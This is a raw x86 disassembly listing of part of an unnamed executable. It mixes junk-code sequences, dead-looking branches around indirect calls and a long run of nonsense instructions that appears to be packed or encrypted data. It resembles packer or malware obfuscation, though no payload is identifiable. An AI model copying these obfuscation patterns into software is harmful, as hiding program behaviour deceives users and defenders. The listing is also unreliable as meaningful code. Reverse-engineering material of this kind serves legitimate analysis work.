  41ef58:	xor    al,0x0
  41ef5a:	add    BYTE PTR [ebx],al
  41ef5c:	test   DWORD PTR [edi+edi*8-0x1],ecx
  41ef60:	inc    DWORD PTR [ecx+0x29cf2]
  41ef66:	add    BYTE PTR ds:0x2e02,dh
  41ef6c:	sbb    ecx,ecx
  41ef6e:	xor    eax,0x7294
  41ef73:	movzx  edx,WORD PTR ds:0x4282f3
  41ef7a:	sbb    DWORD PTR ds:0x4281cf,edx
  41ef80:	imul   eax,eax,0x68f3
  41ef86:	and    DWORD PTR ds:0x4281e7,edi
  41ef8c:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ef92:	cmp    DWORD PTR ds:0x42835b,0x0
  41ef99:	mov    edx,0x254
  41ef9e:	mov    edx,0x254c
  41efa3:	mov    edx,0x6b4f
  41efa8:	jmp    0x41f000
  41efad:	mov    DWORD PTR ds:0x42834b,0x78fa
  41efb7:	cmp    DWORD PTR ds:0x42835b,0x0
  41efbe:	jb     0x41efe4
  41efc4:	push   DWORD PTR [ebp-0x1c]
  41efc7:	push   0x74cd
  41efcc:	push   0x4a2f
  41efd1:	call   DWORD PTR ds:0x428e7c
  41efd7:	sub    edx,DWORD PTR ds:0x42828f
  41efdd:	inc    edx
  41efde:	and    edx,DWORD PTR ds:0x4282ab
  41efe4:	mov    DWORD PTR ds:0x4283f3,0x703b
  41efee:	and    edx,DWORD PTR ds:0x42829b
  41eff4:	xor    edx,DWORD PTR ds:0x428307
  41effa:	and    DWORD PTR ds:0x428407,edx
  41f000:	and    eax,ecx
  41f002:	sub    eax,0x2818
  41f007:	mov    DWORD PTR [ebp-0xe8],eax
  41f00d:	jmp    0x41f369
  41f012:	adc    al,0x29
  41f015:	fstp   DWORD PTR [ebx]
  41f017:	and    BYTE PTR [edx+0x3a],ah
  41f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01b:	repz mov ebx,0xbbf350b0
  41f021:	mov    al,0x99
  41f023:	sub    DWORD PTR [esi],edx
  41f025:	sbb    BYTE PTR [ebx-0x5ee7e7ee],ah
  41f02b:	jbe    0x41efd5
  41f02d:	xor    DWORD PTR [ebx-0x3c],esp
  41f030:	je     0x41eff4
  41f032:	jmp    0x41f051
  41f034:	mov    dh,0x8b
  41f036:	sti    
  41f037:	add    ah,bl
  41f039:	fsub   st,st(2)
  41f03b:	jnp    0x41f06e
  41f03d:	sbb    eax,eax
  41f03f:	push   esi
  41f040:	lds    esp,FWORD PTR [eax-0x43]
  41f043:	dec    eax
  41f044:	and    DWORD PTR [ebp+0x48dfb730],ecx
  41f04a:	mov    al,ds:0x3643a648
  41f04f:	lds    esi,FWORD PTR ds:0xeea978c1
  41f055:	popa   
  41f056:	fsub   st,st(4)
  41f058:	js     0x41f061
  41f05a:	pop    esp
  41f05b:	adc    eax,0xa7269a30
  41f060:	push   si
  41f062:	xchg   ebx,eax
  41f063:	jge    0x41efea
  41f065:	gs mov edx,0x712314fd
  41f06b:	hlt    
  41f06c:	popa   
  41f06d:	mov    ah,0xdb
  41f06f:	mov    ah,0x9c
  41f071:	dec    esi
  41f072:	dec    ebp
  41f073:	ins    DWORD PTR es:[edi],dx
  41f074:	mov    esi,0xd91ac6d9
  41f079:	mov    ebx,0x8e5d00cf
  41f07e:	mov    al,0xf9
  41f080:	mov    ebp,0x9f696145
  41f085:	cmp    al,0xef
  41f087:	pusha  
  41f088:	xor    al,0x3f
  41f08a:	pop    es
  41f08b:	idiv   ah
  41f08d:	inc    eax
  41f08e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f08f:	add    DWORD PTR [edx+eax*1+0x3f0faa00],edi
  41f096:	pop    esi
  41f097:	int3   
  41f098:	scas   eax,DWORD PTR es:[edi]
  41f099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f09a:	xchg   esp,eax
  41f09b:	(bad)  
  41f09c:	xor    bl,BYTE PTR [ecx+0x3b]
  41f09f:	call   0xb54da474
  41f0a4:	cmp    DWORD PTR [esi+0x5b],esi
  41f0a7:	cld    
  41f0a8:	dec    esp
  41f0a9:	test   al,0x93
  41f0ab:	inc    edx
  41f0ac:	pusha  
  41f0ad:	push   es
  41f0ae:	inc    eax
  41f0af:	adc    bh,BYTE PTR [ebp+0x10afa841]
  41f0b5:	loop   0x41f129
  41f0b7:	mov    edx,0x196fe7a9
  41f0bc:	scas   al,BYTE PTR es:[edi]
  41f0bd:	mov    ecx,0xe60177a7
  41f0c2:	pop    edi
  41f0c3:	add    esi,ebp
  41f0c5:	popa   
  41f0c6:	xchg   DWORD PTR [ecx-0x14],eax
  41f0c9:	cmp    BYTE PTR [eax-0x55],ah
  41f0cc:	pop    edi
  41f0cd:	and    eax,0xfae00d40
  41f0d2:	mov    ebp,0xdd2846ee
  41f0d7:	aas    
  41f0d8:	in     al,dx
  41f0d9:	retf   
  41f0da:	push   edi
  41f0db:	ins    BYTE PTR es:[edi],dx
  41f0dc:	pop    eax
  41f0dd:	mov    BYTE PTR [edx-0x4eb6ebd9],al
  41f0e3:	gs aam 0x23
  41f0e6:	pop    esi
  41f0e7:	call   0xb3f9:0xa2b13c7d
  41f0ee:	sahf   
  41f0ef:	adc    al,0x8d
  41f0f1:	sti    
  41f0f2:	mov    ebx,0x837fa9da
  41f0f7:	push   ds
  41f0f8:	and    BYTE PTR [edi-0x22ed35b5],0x44
  41f0ff:	add    BYTE PTR [ebp+0x2c],dh
  41f102:	arpl   WORD PTR [ebx],di
  41f104:	fld    QWORD PTR [edi+0x54c04e53]
  41f10a:	dec    ebx
  41f10b:	xchg   ebp,eax
  41f10c:	mov    BYTE PTR [eax+ebp*8-0x26],dh
  41f110:	shl    BYTE PTR ds:0xdc21bd62,1
  41f116:	gs cmp al,0x81
  41f119:	out    0x7f,eax
  41f11b:	or     ebx,DWORD PTR [eax+0x7fe7666c]
  41f121:	jecxz  0x41f158
  41f123:	xlat   BYTE PTR ds:[ebx]
  41f124:	jns    0x41f0e2
  41f126:	imul   edx,DWORD PTR [ecx-0x9],0x94b378bd
  41f12d:	or     al,0x59
  41f12f:	mov    ebx,0x1255ad1f
  41f134:	test   eax,0x809124b2
  41f139:	and    ch,ch
  41f13b:	pop    ecx
  41f13c:	sub    ebx,DWORD PTR ds:0x16e7467e
  41f142:	fadd   QWORD PTR es:[edi-0x64]
  41f146:	inc    esi
  41f147:	in     al,0x78
  41f149:	popa   
  41f14a:	jbe    0x41f1bb
  41f14c:	and    ebx,esi
  41f14e:	fwait
  41f14f:	sub    al,BYTE PTR [edx+0x3a]
  41f152:	xchg   ebp,eax
  41f153:	xor    DWORD PTR [ecx],esp
  41f155:	mov    ecx,gs
  41f157:	shl    DWORD PTR [ecx+0x6f],cl
  41f15a:	out    0xaa,eax
  41f15c:	cld    
  41f15d:	test   eax,0xd07f785a
  41f162:	adc    ah,al
  41f164:	out    0xba,eax
  41f166:	mov    eax,ds:0x404ef919
  41f16b:	adc    ah,0xd
  41f16e:	ret    0xcb9f
  41f171:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f172:	cmp    BYTE PTR [ecx],ch
  41f174:	mov    ebp,0x99f96c2b
  41f179:	pop    ebp
  41f17a:	jmp    FWORD PTR [ecx+0x5f]
  41f17d:	mov    al,ds:0xe5723cd9
  41f182:	jg     0x41f1f5
  41f184:	cmp    eax,DWORD PTR [ebx-0xc8a5869]
  41f18a:	add    al,0xa2
  41f18c:	jg     0x41f154
  41f18e:	xchg   ebp,eax
  41f18f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41f191:	push   esi
  41f192:	pop    ebp
  41f193:	xchg   edi,eax
  41f194:	sub    cl,al
  41f196:	pop    edx
  41f197:	xchg   ebx,eax
  41f198:	pop    ebx
  41f199:	mov    eax,0xfff5b9c6
  41f19e:	pusha  
  41f19f:	mov    BYTE PTR [edi-0x70],dh
  41f1a2:	iret   
  41f1a3:	or     DWORD PTR [edx+0x5d2de4ef],esp
  41f1a9:	pop    es
  41f1aa:	aas    
  41f1ab:	mov    dh,BYTE PTR [ecx+esi*4+0x7f879fc3]
  41f1b2:	add    ah,BYTE PTR gs:[edi-0x15cee594]
  41f1b9:	sbb    edx,DWORD PTR [eax-0x46]
  41f1bc:	jno    0x41f227
  41f1be:	jo     0x41f140
  41f1c0:	into   
  41f1c1:	add    ah,al
  41f1c3:	mov    ebx,0x583b4ebc
  41f1c8:	mov    ebx,0x193868bc
  41f1cd:	pop    edi
  41f1ce:	xor    cl,dl
  41f1d0:	retf   0x9303
  41f1d3:	and    bh,BYTE PTR [ecx+0x32]
  41f1d6:	push   cs
  41f1d7:	mov    ah,0xde
  41f1d9:	cmp    bl,cl
  41f1db:	dec    ecx
  41f1dc:	jnp    0x41f19f
  41f1de:	jp     0x41f1ae
  41f1e0:	cli    
  41f1e1:	xlat   BYTE PTR ds:[ebx]
  41f1e2:	enter  0x24cb,0x84
  41f1e6:	inc    esi
  41f1e7:	(bad)  
  41f1e8:	cli    
  41f1e9:	arpl   WORD PTR [esi-0x2],si
  41f1ec:	xchg   edi,eax
  41f1ed:	leave  
  41f1ee:	pop    esi
  41f1ef:	lods   al,BYTE PTR ds:[esi]
  41f1f0:	int3   
  41f1f1:	dec    esi
  41f1f2:	or     bl,0x9
  41f1f5:	repz jle 0x41f233
  41f1f8:	fstp   QWORD PTR [edi+esi*2]
  41f1fb:	xchg   BYTE PTR [edi],dh
  41f1fd:	lock xchg ebp,eax
  41f1ff:	mov    ah,0xfb
  41f201:	ret    0x1a0f
  41f204:	inc    esp
  41f205:	xchg   esp,eax
  41f206:	mov    al,ss:0xcaee3155
  41f20c:	xor    al,0x63
  41f20e:	or     eax,0x5334ef4d
  41f214:	sbb    ebp,DWORD PTR [ebx]
  41f216:	popf   
  41f217:	ins    DWORD PTR es:[edi],dx
  41f218:	pushf  
  41f219:	dec    ecx
  41f21a:	xchg   bh,dl
  41f21c:	cli    
  41f21d:	inc    eax
  41f21e:	push   0x326e31f7
  41f223:	or     esi,DWORD PTR [ebx+0x15]
  41f226:	into   
  41f227:	mov    ebp,0xa6fc2672
  41f22c:	fnstcw WORD PTR [ecx]
  41f22e:	add    edx,DWORD PTR [edi+0x658bd12d]
  41f234:	xchg   edx,eax
  41f235:	push   ss
  41f236:	data16 fwait
  41f238:	dec    ebx
  41f239:	mov    dh,0x83
  41f23b:	fisubr WORD PTR [ecx]
  41f23d:	pop    es
  41f23e:	sbb    al,0x32
  41f240:	adc    eax,0x35d9335b
  41f245:	scas   al,BYTE PTR es:[edi]
  41f246:	int3   
  41f247:	sbb    DWORD PTR [esi+0x2d],0xffffffb0
  41f24b:	push   0x34
  41f24d:	jae    0x41f28f
  41f24f:	sbb    DWORD PTR [eax-0x76],eax
  41f252:	iret   
  41f253:	inc    ecx
  41f254:	jmp    DWORD PTR [edi+0x5b20d63b]
  41f25a:	pop    edi
  41f25b:	and    al,0x5
  41f25d:	mov    ecx,0xb371d70
  41f262:	stc    
  41f263:	mov    bh,0x60
  41f265:	or     ebx,DWORD PTR [bx+di+0x6c]
  41f269:	dec    esi
  41f26a:	adc    ebp,DWORD PTR [edi+0x31816696]
  41f270:	mov    esp,0xc3ccfaf6
  41f275:	push   edi
  41f276:	aad    0xbb
  41f278:	and    al,0x8c
  41f27a:	ret    
  41f27b:	out    0x77,eax
  41f27d:	push   ecx
  41f27e:	out    0x11,al
  41f280:	mov    edx,0xaeb49368
  41f285:	in     al,dx
  41f286:	add    ebx,DWORD PTR [eax+0x1]
  41f289:	(bad)  
  41f28b:	cli    
  41f28c:	push   cs
  41f28d:	inc    edi
  41f28e:	leave  
  41f28f:	sub    edx,DWORD PTR [esi-0x5e651295]
  41f295:	or     edi,edx
  41f297:	pop    ecx
  41f298:	sahf   
  41f299:	add    al,0x68
  41f29b:	xor    BYTE PTR [esi-0x72],bh
  41f29e:	sub    eax,0x1f5101ca
  41f2a3:	popa   
  41f2a4:	fld    TBYTE PTR [eax]
  41f2a6:	sti    
  41f2a7:	jle    0x41f2e9
  41f2a9:	stos   DWORD PTR es:[edi],eax
  41f2aa:	push   ds
  41f2ab:	dec    esp
  41f2ac:	jmp    0x4613:0x1f3feed6
  41f2b3:	loopne 0x41f2bd
  41f2b5:	xor    al,0x32
  41f2b7:	xor    ecx,edx
  41f2b9:	sti    
  41f2ba:	bound  edi,QWORD PTR [edx+0x79c5039f]
  41f2c0:	stc    
  41f2c1:	push   ecx
  41f2c2:	mov    ebx,esp
  41f2c4:	in     eax,dx
  41f2c5:	in     eax,dx
  41f2c6:	std    
  41f2c7:	ja     0x41f30f
  41f2c9:	push   ss
  41f2ca:	sub    BYTE PTR [edx],dl
  41f2cc:	loope  0x41f29c
  41f2ce:	xchg   esp,eax
  41f2cf:	sbb    DWORD PTR [ebx-0xe4d5dfb],ecx
  41f2d5:	xchg   ebx,eax
  41f2d6:	into   
  41f2d7:	xchg   edx,eax
  41f2d8:	ins    DWORD PTR es:[edi],dx
  41f2d9:	push   esp
  41f2da:	add    BYTE PTR ds:0x4cc0a0c1,0x17
  41f2e1:	popf   
  41f2e2:	cdq    
  41f2e3:	cdq    
  41f2e4:	test   DWORD PTR [ecx-0x14361911],ebx
  41f2ea:	pop    esi
  41f2eb:	clc    
  41f2ec:	rcl    dl,1
  41f2ee:	push   ebx
  41f2ef:	call   FWORD PTR [edx+0x42]
  41f2f2:	(bad)  
  41f2f3:	and    dl,BYTE PTR ds:0xbb01625d
  41f2f9:	mov    bl,0xf3
  41f2fb:	arpl   WORD PTR [esi],cx
  41f2fd:	xchg   ecx,eax
  41f2fe:	(bad)
  41f301:	cmp    ecx,DWORD PTR [edx+0x71]
  41f304:	or     al,0xc7
  41f306:	ins    DWORD PTR es:[edi],dx
  41f307:	cmc    
  41f308:	push   ecx
  41f309:	(bad)  
  41f30a:	push   ss
  41f30b:	loop   0x41f353
  41f30d:	sbb    ax,0x3ce1
  41f311:	pop    ebp
  41f312:	jnp    0x175b05c3
  41f318:	push   ds
  41f319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f31a:	and    ch,al
  41f31c:	push   ebp
  41f31d:	arpl   di,bp
  41f31f:	icebp  
  41f320:	cli    
  41f321:	jle    0x41f2ac
  41f323:	pop    es
  41f324:	add    ch,bl
  41f326:	pop    ebp
  41f327:	iret   
  41f328:	cmp    BYTE PTR [eax-0x54565e5e],dl
  41f32e:	std    
  41f32f:	push   ebp
  41f330:	imul   edx,eax,0xa8fb3a1e
  41f336:	pop    ds
  41f337:	dec    esi
  41f338:	or     DWORD PTR [eax+0x7714650e],eax
  41f33e:	fcomp  DWORD PTR [ecx+esi*4-0x80]
  41f342:	sbb    ebp,esi
  41f344:	or     bh,BYTE PTR [ecx+eax*8-0x54]
  41f348:	xor    ch,dl
  41f34a:	xchg   DWORD PTR [eax-0x3f0c379a],ebx
  41f350:	(bad)  
  41f352:	stos   BYTE PTR es:[edi],al
  41f353:	add    al,0x2d
  41f355:	xchg   edx,eax
  41f356:	loope  0x41f3cf
  41f358:	lahf   
  41f359:	adc    DWORD PTR ds:0x2430885b,edx
  41f35f:	add    al,0xcb
  41f361:	in     eax,dx
  41f362:	(bad)  
  41f364:	sub    al,0xcb
  41f366:	dec    ebx
  41f367:	mov    eax,ds:0x9045c787
  41f36c:	mov    DWORD PTR [edi+0x0],ebp
  41f36f:	add    BYTE PTR [ebx+0x4283733d],al
  41f375:	add    BYTE PTR [eax],al
  41f377:	movzx  edx,WORD PTR ds:0x42828f
  41f37e:	mov    ecx,DWORD PTR ds:0x4282d7
  41f384:	mov    ecx,DWORD PTR ds:0x4282c3
  41f38a:	jmp    0x41f3f3
  41f38f:	not    eax
  41f391:	mov    DWORD PTR ds:0x4282af,ebx
  41f397:	cmp    DWORD PTR ds:0x428373,0x0
  41f39e:	jbe    0x41f3dd
  41f3a4:	push   DWORD PTR [ebp-0x14]
  41f3a7:	push   DWORD PTR [ebp-0x28]
  41f3aa:	push   DWORD PTR [ebp-0x10]
  41f3ad:	push   0x428183
  41f3b2:	push   0x1cee
  41f3b7:	push   0x479c
  41f3bc:	push   0x8744
  41f3c1:	call   DWORD PTR ds:0x428e80
  41f3c7:	sub    ecx,DWORD PTR ds:0x4282a7
  41f3cd:	mov    DWORD PTR ds:0x4281f7,0x2f55
  41f3d7:	and    DWORD PTR ds:0x428353,ebx
  41f3dd:	or     DWORD PTR ds:0x42836b,ecx
  41f3e3:	xor    edx,edx
  41f3e5:	or     edx,DWORD PTR ds:0x4281ff
  41f3eb:	mov    edx,DWORD PTR [edx]
  41f3ed:	sbb    DWORD PTR ds:0x428387,edx
  41f3f3:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41f3fd:	mov    DWORD PTR [ebp-0x120],0x3c77
  41f407:	mov    DWORD PTR [ebp-0x2c],0x2129
  41f40e:	or     DWORD PTR ds:0x4281df,0x8a7
  41f418:	mov    eax,DWORD PTR [ebp-0x2c]
  41f41b:	imul   eax,eax,0x1ada
  41f421:	cmp    DWORD PTR ds:0x4283eb,0x0
  41f428:	mov    DWORD PTR ds:0x42837f,0xae0
  41f432:	mov    DWORD PTR ds:0x4281bb,ebx
  41f438:	mov    ecx,DWORD PTR ds:0x4283db
  41f43e:	jmp    0x41f484
  41f443:	mov    DWORD PTR ds:0x428363,ebx
  41f449:	mov    DWORD PTR ds:0x4281df,0x2430
  41f453:	cmp    DWORD PTR ds:0x4283eb,0x0
  41f45a:	ja     0x41f47c
  41f460:	push   DWORD PTR [ebp-0x18]
  41f463:	push   0x427f95
  41f468:	call   DWORD PTR ds:0x428f04
  41f46e:	sub    ecx,0x6218
  41f474:	inc    DWORD PTR ds:0x4283f7
  41f47a:	add    edx,edx
  41f47c:	or     edx,ecx
  41f47e:	sub    edx,0x9ad
  41f484:	mov    ecx,DWORD PTR [ebp-0x120]
  41f48a:	cmp    DWORD PTR ds:0x4281f7,0x0
  41f491:	not    edx
  41f493:	mov    DWORD PTR ds:0x42834f,0x6486
  41f49d:	mov    DWORD PTR ds:0x4282bb,0x7a92
  41f4a7:	mov    DWORD PTR ds:0x4282eb,ebx
  41f4ad:	jmp    0x41f510
  41f4b2:	mov    DWORD PTR ds:0x4283f3,0x24a4
  41f4bc:	cmp    DWORD PTR ds:0x4281f7,0x0
  41f4c3:	ja     0x41f4ed
  41f4c9:	push   0x42805b
  41f4ce:	push   DWORD PTR [ebp-0x10]
  41f4d1:	call   DWORD PTR ds:0x428e84
  41f4d7:	neg    DWORD PTR ds:0x4281eb
  41f4dd:	and    DWORD PTR ds:0x4282cf,0x428353
  41f4e7:	and    DWORD PTR ds:0x4283cf,edi
  41f4ed:	movzx  edx,BYTE PTR ds:0x4281e7
  41f4f4:	sbb    edx,DWORD PTR ds:0x42836f
  41f4fa:	mov    DWORD PTR ds:0x4281e7,edx
  41f500:	sub    DWORD PTR ds:0x4282e3,0x2ffe
  41f50a:	and    edx,0x4c8b
  41f510:	imul   ecx,ecx,0x53ae
  41f516:	and    DWORD PTR ds:0x4281ef,ebx
  41f51c:	imul   ecx,ecx,0x7447
  41f522:	mov    edx,DWORD PTR [ebp-0xd0]
  41f528:	sbb    DWORD PTR ds:0x4283f3,0x1933
  41f532:	and    ecx,edx
  41f534:	cmp    DWORD PTR ds:0x4281d3,0x0
  41f53b:	mov    DWORD PTR ds:0x4283ef,0x38cb
  41f545:	mov    edx,0x66af
  41f54a:	not    edx
  41f54c:	jmp    0x41f5db
  41f551:	mov    DWORD PTR ds:0x4282af,0x6044
  41f55b:	not    DWORD PTR ds:0x4282bb
  41f561:	cmp    DWORD PTR ds:0x4281d3,0x0
  41f568:	jg     0x41f5a9
  41f56e:	push   0x13fa
  41f573:	push   DWORD PTR [ebp-0x18]
  41f576:	push   0x47c2
  41f57b:	push   DWORD PTR [ebp-0x1c]
  41f57e:	push   0x5b80
  41f583:	push   DWORD PTR [ebp-0x10]
  41f586:	push   0x6360
  41f58b:	push   0x2aad
  41f590:	push   DWORD PTR [ebp-0x28]
  41f593:	push   DWORD PTR [ebp-0x10]
  41f596:	call   DWORD PTR ds:0x428e88
  41f59c:	inc    edx
  41f59d:	adc    DWORD PTR ds:0x4281b3,edi
  41f5a3:	and    DWORD PTR ds:0x42834b,ecx
  41f5a9:	movzx  edx,WORD PTR ds:0x428363
  41f5b0:	add    edx,DWORD PTR ds:0x42835b
  41f5b6:	mov    DWORD PTR ds:0x428363,edx
  41f5bc:	add    DWORD PTR ds:0x428357,0x7749
  41f5c6:	adc    DWORD PTR ds:0x4282bb,0x1ba
  41f5d0:	dec    edx
  41f5d1:	sub    DWORD PTR ds:0x4283ef,0x6520
  41f5db:	or     ecx,0x2a20
  41f5e1:	mov    DWORD PTR ds:0x4281fb,0x1cbf
  41f5eb:	mov    edx,DWORD PTR [ebp-0x70]
  41f5ee:	adc    DWORD PTR ds:0x42837f,0x2406
  41f5f8:	xor    ecx,edx
  41f5fa:	or     DWORD PTR ds:0x42836f,ecx
  41f600:	mov    edx,DWORD PTR [ebp+0x14]
  41f603:	adc    DWORD PTR ds:0x4283f3,0x652b
  41f60d:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41f614:	xor    DWORD PTR ds:0x4282b7,0x49e9
  41f61e:	lea    eax,[ecx+eax*1-0x45a1]
  41f625:	cmp    DWORD PTR ds:0x4282cb,0x0
  41f62c:	mov    ecx,0x2e1f
  41f631:	mov    DWORD PTR ds:0x4282e7,ecx
  41f637:	mov    ecx,0x173d
  41f63c:	not    DWORD PTR ds:0x4282b3
  41f642:	jmp    0x41f698
  41f647:	mov    DWORD PTR ds:0x4282ff,0x35b0
  41f651:	cmp    DWORD PTR ds:0x4282cb,0x0
  41f658:	jae    0x41f680
  41f65e:	push   0x2832
  41f663:	call   DWORD PTR ds:0x428e8c
  41f669:	dec    ecx
  41f66a:	or     DWORD PTR ds:0x42828b,0x127d
  41f674:	mov    ecx,DWORD PTR ds:0x428357
  41f67a:	add    DWORD PTR ds:0x42837b,ecx
  41f680:	sbb    DWORD PTR ds:0x4282ef,ebx
  41f686:	mov    ecx,DWORD PTR ds:0x4281c3
  41f68c:	adc    DWORD PTR ds:0x4281b7,ecx
  41f692:	and    ecx,0x3d62
  41f698:	mov    DWORD PTR [ebp-0xb0],eax
  41f69e:	mov    ecx,DWORD PTR ds:0x42841f
  41f6a4:	mov    ecx,DWORD PTR [ecx]
  41f6a6:	xor    DWORD PTR ds:0x4282af,ecx
  41f6ac:	mov    DWORD PTR [ebp-0x11c],0x303f
  41f6b6:	not    eax
  41f6b8:	mov    DWORD PTR [ebp-0x98],0x51a9
  41f6c2:	sub    DWORD PTR ds:0x428383,0x1cf2
  41f6cc:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41f6d6:	xor    eax,ecx
  41f6d8:	mov    eax,DWORD PTR [ebp-0xcc]
  41f6de:	cmp    DWORD PTR ds:0x428367,0x0
  41f6e5:	mov    DWORD PTR ds:0x42836f,0x6375
  41f6ef:	not    DWORD PTR ds:0x4281cf
  41f6f5:	mov    DWORD PTR ds:0x42828b,ecx
  41f6fb:	jmp    0x41f76f
  41f700:	mov    DWORD PTR ds:0x42829b,0x2351
  41f70a:	mov    DWORD PTR ds:0x4282df,ebx
  41f710:	cmp    DWORD PTR ds:0x428367,0x0
  41f717:	jb     0x41f758
  41f71d:	push   0x3851
  41f722:	push   0x4282cb
  41f727:	call   DWORD PTR ds:0x428e90
  41f72d:	movzx  ecx,WORD PTR ds:0x42829b
  41f734:	xor    DWORD PTR ds:0x428407,ecx
  41f73a:	mov    ecx,DWORD PTR ds:0x4282cb
  41f740:	add    ecx,DWORD PTR ds:0x4282c3
  41f746:	mov    DWORD PTR ds:0x4282cb,ecx
  41f74c:	mov    ecx,DWORD PTR ds:0x4282db
  41f752:	adc    DWORD PTR ds:0x4283eb,ecx
  41f758:	inc    ecx
  41f759:	xor    DWORD PTR ds:0x428387,ebx
  41f75f:	sub    DWORD PTR ds:0x4281e7,edx
  41f765:	and    DWORD PTR ds:0x428367,0x3308
  41f76f:	xor    eax,0x6f65
  41f774:	add    DWORD PTR ds:0x42837b,edx
  41f77a:	mov    ecx,DWORD PTR [ebp-0x98]
  41f780:	add    DWORD PTR ds:0x4283e7,0x42835b
  41f78a:	or     eax,ecx
  41f78c:	and    DWORD PTR ds:0x428297,0x3807
  41f796:	add    eax,0x161e
  41f79b:	or     ecx,DWORD PTR ds:0x4282a7
  41f7a1:	mov    ecx,DWORD PTR [ebp-0x11c]
  41f7a7:	add    DWORD PTR ds:0x42829b,0x4281f7
  41f7b1:	or     eax,ecx
  41f7b3:	add    DWORD PTR ds:0x4283e7,edi
  41f7b9:	add    eax,0x1cca
  41f7be:	or     ecx,DWORD PTR ds:0x4282e7
  41f7c4:	xor    eax,0x96c9
  41f7c9:	mov    DWORD PTR [ebp-0x38],eax
  41f7cc:	cmp    DWORD PTR ds:0x4283f3,0x0
  41f7d3:	mov    ecx,DWORD PTR ds:0x4283d7
  41f7d9:	mov    DWORD PTR ds:0x4283cb,ecx
  41f7df:	mov    DWORD PTR ds:0x42836f,0x7d57
  41f7e9:	jmp    0x41f8c3
  41f7ee:	mov    DWORD PTR ds:0x4282ef,0xe1
  41f7f8:	mov    DWORD PTR ds:0x4281e7,edi
  41f7fe:	cmp    DWORD PTR ds:0x4283f3,0x0
  41f805:	jne    0x41f836
  41f80b:	push   DWORD PTR [ebp-0xc]
  41f80e:	push   0x427fda
  41f813:	push   0x427f41
  41f818:	call   DWORD PTR ds:0x428f08
  41f81e:	sub    ecx,ecx
  41f820:	xor    ecx,ecx
  41f822:	add    ecx,DWORD PTR ds:0x42841b
  41f828:	mov    ecx,DWORD PTR [ecx]
  41f82a:	add    DWORD PTR ds:0x4282d7,ecx
  41f830:	adc    DWORD PTR ds:0x4281bf,edi
  41f836:	and    DWORD PTR ds:0x4283ff,0x3101
  41f840:	mov    DWORD PTR ds:0x428407,0x28b7
  41f84a:	cmp    DWORD PTR ds:0x4281cf,0x0
  41f851:	mov    ecx,DWORD PTR ds:0x4282bf
  41f857:	mov    DWORD PTR ds:0x4282ab,0x4504
  41f861:	mov    DWORD PTR ds:0x4283df,0x3c46
  41f86b:	mov    ecx,DWORD PTR ds:0x428403
  41f871:	jmp    0x41f8c3
  41f876:	mov    DWORD PTR ds:0x42836f,ebx
  41f87c:	cmp    DWORD PTR ds:0x4281cf,0x0
  41f883:	jge    0x41f8b3
  41f889:	push   0x1
  41f88b:	push   0x42800c
  41f890:	push   0x428016
  41f895:	call   DWORD PTR ds:0x428f0c
  41f89b:	and    DWORD PTR ds:0x4281e7,ebx
  41f8a1:	add    ecx,ecx
  41f8a3:	adc    DWORD PTR ds:0x42836f,0x1bb
  41f8ad:	and    ecx,DWORD PTR ds:0x428403
  41f8b3:	sub    ecx,0x5232
  41f8b9:	sub    DWORD PTR ds:0x4281d7,0x6c90
  41f8c3:	mov    DWORD PTR [ebp-0x118],0x6083
  41f8cd:	or     DWORD PTR ds:0x4282c7,ebx
  41f8d3:	mov    DWORD PTR [ebp-0x88],0x556
  41f8dd:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41f8e7:	mov    eax,DWORD PTR [ebp-0x140]
  41f8ed:	add    eax,0x5af8
  41f8f2:	xor    DWORD PTR ds:0x4283db,0x37e5
  41f8fc:	mov    ecx,DWORD PTR [ebp-0x88]
  41f902:	sub    DWORD PTR ds:0x4281c3,0x4283ff
  41f90c:	sub    eax,ecx
  41f90e:	dec    DWORD PTR ds:0x4282d7
  41f914:	mov    ecx,DWORD PTR [ebp-0x118]
  41f91a:	lea    eax,[eax+ecx*1+0x68dc]
  41f921:	or     eax,0x52f6
  41f926:	adc    ecx,DWORD PTR ds:0x42828f
  41f92c:	sub    eax,0x1dbfe
  41f931:	mov    DWORD PTR [ebp-0xac],eax
  41f937:	cmp    DWORD PTR ds:0x428353,0x0
  41f93e:	mov    DWORD PTR ds:0x428363,0x63c0
  41f948:	mov    DWORD PTR ds:0x4281f3,0x2316
  41f952:	mov    ecx,0x40fd
  41f957:	jmp    0x41f99f
  41f95c:	mov    eax,ds:0x4282ff
  41f961:	mov    eax,0x5fd6
  41f966:	cmp    DWORD PTR ds:0x428353,0x0
  41f96d:	je     0x41f98d
  41f973:	call   DWORD PTR ds:0x428f10
  41f979:	sbb    DWORD PTR ds:0x428403,0x209
  41f983:	xor    DWORD PTR ds:0x4283f3,0x72db
  41f98d:	add    ecx,ecx
  41f98f:	and    DWORD PTR ds:0x4282ef,0x6064
  41f999:	or     ecx,0x4aaa
  41f99f:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41f9a6:	mov    DWORD PTR [ebp-0x100],0x49f7
  41f9b0:	xor    ecx,eax
  41f9b2:	mov    eax,DWORD PTR [ebp-0x100]
  41f9b8:	movzx  ecx,WORD PTR ds:0x4281f3
  41f9bf:	or     DWORD PTR ds:0x4283df,ecx
  41f9c5:	add    eax,0x7b60
  41f9ca:	cmp    DWORD PTR ds:0x428357,0x0
  41f9d1:	mov    DWORD PTR ds:0x42829b,0x756d
  41f9db:	mov    DWORD PTR ds:0x428353,0x1d60
  41f9e5:	jmp    0x41fa41
  41f9ea:	mov    ecx,DWORD PTR ds:0x42835b
  41f9f0:	cmp    DWORD PTR ds:0x428357,0x0
  41f9f7:	jg     0x41fa21
  41f9fd:	push   0x59e0
  41fa02:	call   DWORD PTR ds:0x428e94
  41fa08:	adc    DWORD PTR ds:0x4283ef,ebx
  41fa0e:	sbb    DWORD PTR ds:0x428373,ebx
  41fa14:	movzx  ecx,WORD PTR ds:0x4283cb
  41fa1b:	add    DWORD PTR ds:0x4283db,ecx
  41fa21:	add    DWORD PTR ds:0x4283d3,0x77eb
